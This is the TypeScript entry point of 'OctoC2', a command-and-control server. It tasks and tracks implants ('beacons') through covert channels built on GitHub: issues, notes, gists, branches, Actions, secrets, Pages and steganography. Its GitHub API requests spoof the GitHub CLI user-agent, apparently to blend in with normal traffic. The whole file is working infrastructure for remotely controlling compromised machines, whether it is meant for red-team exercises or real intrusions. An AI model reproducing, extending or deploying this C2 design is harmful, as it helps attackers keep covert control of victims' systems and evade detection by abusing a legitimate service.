/**
 * OctoC2 Server — Entry Point
 *
 * Loads controller credentials, initializes durable state and every configured
 * channel, then blocks until shutdown.
 *
 * Required environment variables:
 *   OCTOC2_SERVER_GITHUB_TOKEN — Server-only repository credential
 *   OCTOC2_REPO_OWNER          — GitHub org/user that owns the C2 repo
 *   OCTOC2_REPO_NAME           — C2 repository name
 *   OCTOC2_OPERATOR_SECRET     — Base64url X25519 secret key
 *
 * Semi-optional (one must be set):
 *   MONITORING_PUBKEY  — Base64url X25519 public key.
 *                             Preferred: set as a GitHub repo Variable so beacons
 *                             can discover it without baking it into binaries.
 *                             Fallback: this env var.
 *
 * Direct HTTP and gRPC listeners are disabled by default. Enabling either
 * requires role-separated controller credentials and operator-issued TLS
 * certificate files. Both bind to 127.0.0.1 unless an explicit host is
 * configured.
 */

import { Octokit }                           from "@octokit/rest";
import { readFile }                          from "node:fs/promises";
import { createHash }                        from "node:crypto";
import { BeaconRegistry }                    from "./BeaconRegistry.ts";
import { TaskQueue }                         from "./TaskQueue.ts";
import { IssuesChannel, resolveOperatorPublicKey } from "./channels/IssuesChannel.ts";
import { NotesChannel }                      from "./channels/NotesChannel.ts";
import { GistChannel }                       from "./channels/GistChannel.ts";
import { BranchChannel }                     from "./channels/BranchChannel.ts";
import { ActionsChannel }                    from "./channels/ActionsChannel.ts";
import { SecretsChannel }                    from "./channels/SecretsChannel.ts";
import { PagesChannel }                      from "./channels/PagesChannel.ts";
import { SteganographyChannel }              from "./channels/SteganographyChannel.ts";
import {
  BeaconGrpcService,
  parseGrpcClientCertificateFingerprintMap,
} from "./grpc/BeaconGrpcService.ts";
import { DashboardHttpServer }               from "./http/DashboardHttpServer.ts";
import { base64ToBytes }                     from "./crypto/sodium.ts";
import { CredentialVerifier, parseCredentialMap } from "./services/CredentialVerifier.ts";
import { OctoStore }                         from "./store/index.ts";
import { BeaconIdentityService }             from "./services/BeaconIdentityService.ts";
import { TaskService }                       from "./services/TaskService.ts";
import { loadEnrollmentDirectory }           from "./services/EnrollmentLoader.ts";
import {
  startRecoveryPublisherFromEnv,
  type RecoveryPublisherRuntime,
} from "./services/RecoveryPublisherBootstrap.ts";
import { parseOidcBindings }                  from "./http/OidcRoutes.ts";
import {
  isLoopbackHost,
  readBooleanFlag,
  readListenerConfig,
} from "./config/RuntimeConfig.ts";
import { resolveGistServerToken } from "./config/GistConfig.ts";

// ── Env helpers ───────────────────────────────────────────────────────────────

function requireEnv(name: string): string {
  const val = process.env[name];
  if (!val || val.trim() === "") {
    console.error(`[Server] Fatal: environment variable '${name}' is required but not set.`);
    process.exit(1);
  }
  return val.trim();
}

function optionalEnvInt(name: string, defaultVal: number): number {
  const val = process.env[name];
  if (!val) return defaultVal;
  if (!/^[1-9][0-9]*$/.test(val.trim())) {
    throw new Error(`${name} must be a positive integer`);
  }
  const n = Number(val);
  if (!Number.isSafeInteger(n)) {
    throw new Error(`${name} must be a positive safe integer`);
  }
  return n;
}

function persistCredentialHashes(
  store: OctoStore,
  operatorToken: string,
  beaconTokens: Readonly<Record<string, string>>,
): void {
  const persist = (
    principalType: "operator" | "beacon",
    principal: string,
    tokenValue: string,
  ) => {
    const hash = createHash("sha256").update(tokenValue, "utf8").digest("hex");
    const credentialId = `env:${principalType}:${principal}:${hash.slice(0, 16)}`;
    if (store.getCredential(credentialId)) return;
    store.insertCredentialHash({
      credentialId,
      principalType,
      beaconId: principalType === "beacon" ? principal : null,
      tokenHash: hash,
      hashAlgorithm: "sha256",
      label: "environment-provisioned",
      scopes: principalType === "beacon"
        ? ["beacon:checkin", "beacon:result"]
        : ["operator:api"],
    });
  };
  if (operatorToken) persist("operator", "operator", operatorToken);
  for (const [beaconId, tokenValue] of Object.entries(beaconTokens)) {
    persist("beacon", beaconId, tokenValue);
  }
}

// ── Startup ───────────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  console.log("[OctoC2 Server] Starting operator controller…");

  // ── Load configuration ─────────────────────────────────────────────────────
  const token        = requireEnv("OCTOC2_SERVER_GITHUB_TOKEN");
  const owner        = requireEnv("OCTOC2_REPO_OWNER");
  const repo         = requireEnv("OCTOC2_REPO_NAME");
  const secretB64    = requireEnv("OCTOC2_OPERATOR_SECRET");
  const pollInterval = optionalEnvInt("OCTOC2_POLL_INTERVAL_MS", 30_000);
  const listeners    = readListenerConfig();
  const grpcEnabled  = listeners.grpc.enabled;
  const httpEnabled  = listeners.http.enabled;
  for (const [name, listener] of Object.entries(listeners)) {
    if (listener.enabled && !isLoopbackHost(listener.host)) {
      console.warn(
        `[Server] Warning: ${name.toUpperCase()} is explicitly exposed on non-loopback host ${listener.host}`,
      );
    }
  }
  const operatorApiToken = httpEnabled ? requireEnv("OCTOC2_OPERATOR_API_TOKEN") : "";
  const beaconTokenMap = (httpEnabled || grpcEnabled)
    ? parseCredentialMap(
        requireEnv("OCTOC2_BEACON_API_TOKENS"),
        "OCTOC2_BEACON_API_TOKENS",
      )
    : {};
  const gistToken = resolveGistServerToken(
    process.env["OCTOC2_SERVER_GIST_TOKEN"],
    [token, operatorApiToken, ...Object.values(beaconTokenMap)],
  );
  if (operatorApiToken === token || Object.values(beaconTokenMap).includes(token)) {
    throw new Error("The server GitHub credential cannot be used as a controller API credential");
  }
  if (operatorApiToken && Object.values(beaconTokenMap).includes(operatorApiToken)) {
    throw new Error("Operator and beacon API tokens must be distinct");
  }
  const operatorCredentials = httpEnabled
    ? new CredentialVerifier({ operator: operatorApiToken })
    : null;
  const beaconCredentials = (httpEnabled || grpcEnabled)
    ? new CredentialVerifier(beaconTokenMap)
    : null;
  const grpcTls = grpcEnabled
    ? {
        rootCerts: await readFile(requireEnv("OCTOC2_GRPC_CA_CERT")),
        privateKey: await readFile(requireEnv("OCTOC2_GRPC_SERVER_KEY")),
        certChain: await readFile(requireEnv("OCTOC2_GRPC_SERVER_CERT")),
        clientCertificateFingerprints:
          parseGrpcClientCertificateFingerprintMap(
            requireEnv("OCTOC2_GRPC_CLIENT_CERT_FINGERPRINTS"),
            Object.keys(beaconTokenMap),
          ),
      }
    : null;
  const httpTls = httpEnabled
    ? {
        cert: await readFile(listeners.http.tlsCertificateFile!),
        key: await readFile(listeners.http.tlsPrivateKeyFile!),
      }
    : null;

  // Decode operator secret key
  const operatorSecretKey = await base64ToBytes(secretB64);
  if (operatorSecretKey.length !== 32) {
    console.error("[Server] Fatal: OCTOC2_OPERATOR_SECRET decoded to invalid length. Run: octoctl keygen");
    process.exit(1);
  }

  // Shared Octokit used for key resolution and passed to the channel
  const octokit = new Octokit({
    auth:    token,
    headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
  });
  const gistOctokit = gistToken
    ? new Octokit({
        auth: gistToken,
        headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
      })
    : null;

  // Resolve operator public key: GitHub Variable preferred, env fallback
  let operatorPublicKey: Uint8Array;
  try {
    operatorPublicKey = await resolveOperatorPublicKey(octokit, owner, repo);
  } catch (err) {
    console.error("[Server] Fatal:", (err as Error).message);
    process.exit(1);
  }

  // ── Initialize subsystems ──────────────────────────────────────────────────
  const dataDir   = process.env["OCTOC2_DATA_DIR"] ?? "./data";
  const store = OctoStore.open({ dataDir });
  const registry  = new BeaconRegistry(store);
  const taskQueue = new TaskQueue(store);
  const checkinClockSkewMs = optionalEnvInt(
    "OCTOC2_CHECKIN_MAX_FUTURE_SKEW_MS",
    5 * 60 * 1000,
  );
  const checkinMaxAgeMs = optionalEnvInt(
    "OCTOC2_CHECKIN_MAX_AGE_MS",
    30 * 60 * 1000,
  );
  const identities = new BeaconIdentityService(
    store,
    registry,
    checkinClockSkewMs,
    checkinMaxAgeMs,
  );
  const tasks = new TaskService(store, registry, taskQueue);
  const channelServices = { store, identities, tasks, queue: taskQueue };
  const oidcBindingsRaw = process.env["OCTOC2_OIDC_BINDINGS"]?.trim();
  const oidcHttpConfig = oidcBindingsRaw
    ? {
        store,
        operatorPublicKey,
        operatorSecretKey,
        bindings: parseOidcBindings(oidcBindingsRaw),
        ...(process.env["OCTOC2_OIDC_AUDIENCE"]?.trim() && {
          audience: process.env["OCTOC2_OIDC_AUDIENCE"]!.trim(),
        }),
      }
    : undefined;

  const enrollmentDir = process.env["OCTOC2_ENROLLMENT_DIR"]?.trim();
  if (enrollmentDir) {
    const count = await loadEnrollmentDirectory(enrollmentDir, identities);
    console.log(`[Server] Imported ${count} enrollment artifact(s)`);
  }
  persistCredentialHashes(store, operatorApiToken, beaconTokenMap);
  operatorCredentials?.attachStore(store, "operator");
  beaconCredentials?.attachStore(store, "beacon");
  await registry.load();
  registry.startAutoSave();
  let recoveryPublisher: RecoveryPublisherRuntime | null = null;
  if (readBooleanFlag(process.env["OCTOC2_RECOVERY_PUBLISH_ENABLED"])) {
    recoveryPublisher = await startRecoveryPublisherFromEnv(store);
  } else {
    console.log("[Server] Proactive recovery publisher disabled");
  }

  const channel = new IssuesChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorPublicKey,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,  // reuse the instance already used for key resolution
  }, channelServices);

  const notesChannel = new NotesChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
  }, channelServices);

  const gistChannel = gistOctokit
    ? new GistChannel(registry, taskQueue, {
        owner,
        repo,
        token: gistToken!,
        operatorSecretKey,
        pollIntervalMs: pollInterval,
        octokit: gistOctokit,
      }, channelServices)
    : null;

  const branchChannel = new BranchChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
    services: channelServices,
  });

  const actionsChannel = new ActionsChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
  }, channelServices);

  const secretsChannel = new SecretsChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
  }, channelServices);

  const pagesChannel = new PagesChannel(registry, taskQueue, {
    owner,
    repo,
    token,
    operatorSecretKey,
    pollIntervalMs: pollInterval,
    octokit,
    services: channelServices,
  });

  const steganographyChannel = new SteganographyChannel(
    registry,
    taskQueue,
    {
      owner,
      repo,
      token,
      operatorSecretKey,
      pollIntervalMs: pollInterval,
      octokit,
    },
    channelServices,
  );

  const grpcService = grpcEnabled
    ? new BeaconGrpcService(
        registry,
        taskQueue,
        beaconCredentials!,
        grpcTls!,
        identities,
        tasks,
      )
    : null;

  const httpServer = httpEnabled
    ? new DashboardHttpServer(
        registry,
        taskQueue,
        operatorCredentials!,
        beaconCredentials!,
        identities,
        tasks,
        { octokit, owner, repo },
        oidcHttpConfig,
      )
    : null;

  const lifecycleIntervalMs = optionalEnvInt(
    "OCTOC2_LIFECYCLE_INTERVAL_MS",
    60_000,
  );
  const dormantAfterMs = optionalEnvInt(
    "OCTOC2_BEACON_DORMANT_AFTER_MS",
    10 * 60 * 1000,
  );
  const lostAfterMs = optionalEnvInt(
    "OCTOC2_BEACON_LOST_AFTER_MS",
    24 * 60 * 60 * 1000,
  );
  if (lostAfterMs <= dormantAfterMs) {
    throw new Error(
      "OCTOC2_BEACON_LOST_AFTER_MS must exceed OCTOC2_BEACON_DORMANT_AFTER_MS",
    );
  }
  const processedMessageRetentionMs = optionalEnvInt(
    "OCTOC2_PROCESSED_MESSAGE_RETENTION_MS",
    30 * 24 * 60 * 60 * 1000,
  );
  const lifecycleTimer = setInterval(() => {
    taskQueue.sweepExpired();
    registry.sweepStatuses(dormantAfterMs, lostAfterMs);
    store.expireTasks();
    store.revokeExpiredCredentials();
    const retentionCutoff =
      new Date(Date.now() - processedMessageRetentionMs).toISOString();
    store.deleteProcessedMessagesBefore(retentionCutoff);
    const oidcSweep = store.sweepOidcRequests(retentionCutoff);
    for (const taskId of oidcSweep.releasedTaskIds) {
      taskQueue.refreshTask(taskId);
    }
  }, lifecycleIntervalMs);

  // ── Graceful shutdown ──────────────────────────────────────────────────────
  const shutdown = async (signal: string) => {
    console.log(`\n[Server] Received ${signal}. Shutting down…`);
    await Promise.all([
      channel.stop(),
      notesChannel.stop(),
      ...(gistChannel ? [gistChannel.stop()] : []),
      branchChannel.stop(),
      actionsChannel.stop(),
      secretsChannel.stop(),
      pagesChannel.stop(),
      steganographyChannel.stop(),
    ]);
    if (grpcService) await grpcService.stop();
    if (httpServer) httpServer.stop();
    if (recoveryPublisher) await recoveryPublisher.stop();
    clearInterval(lifecycleTimer);
    await registry.shutdown();
    store.close();
    console.log("[Server] Shutdown complete.");
    process.exit(0);
  };

  process.on("SIGINT",  () => { shutdown("SIGINT").catch(console.error); });
  process.on("SIGTERM", () => { shutdown("SIGTERM").catch(console.error); });

  // ── Start gRPC listener ────────────────────────────────────────────────────
  if (grpcService) {
    try {
      await grpcService.start(
        listeners.grpc.port,
        listeners.grpc.host,
      );
    } catch (err) {
      console.error(
        `[Server] Fatal: gRPC listener failed to start on ${listeners.grpc.host}:${listeners.grpc.port}: ${(err as Error).message}`
      );
      process.exit(1);
    }
  } else {
    console.log("[Server] gRPC listener disabled (set OCTOC2_GRPC_ENABLED=true to enable)");
  }

  // ── Start HTTP dashboard API ───────────────────────────────────────────────
  if (httpServer) {
    httpServer.start(listeners.http.port, listeners.http.host, httpTls!);
  } else {
    console.log("[Server] HTTP dashboard API disabled (set OCTOC2_HTTP_ENABLED=true to enable)");
  }

  // ── Start Issues polling ───────────────────────────────────────────────────
  console.log(`[Server] Polling ${owner}/${repo} every ${pollInterval}ms`);
  console.log(`[Server] Registry: ${registry.getAll().length} beacon(s) loaded`);

  channel.start();
  notesChannel.start();
  if (gistChannel) {
    gistChannel.start();
  } else {
    console.log(
      "[Server] Gist channel disabled (set OCTOC2_SERVER_GIST_TOKEN to enable)",
    );
  }
  branchChannel.start();
  actionsChannel.start();
  secretsChannel.start();
  pagesChannel.start();
  steganographyChannel.start();

  console.log("[Server] Ready. Waiting for beacon checkins…");
}

main().catch((err) => {
  console.error("[Server] Unhandled startup error:", (err as Error).message);
  process.exit(1);
});
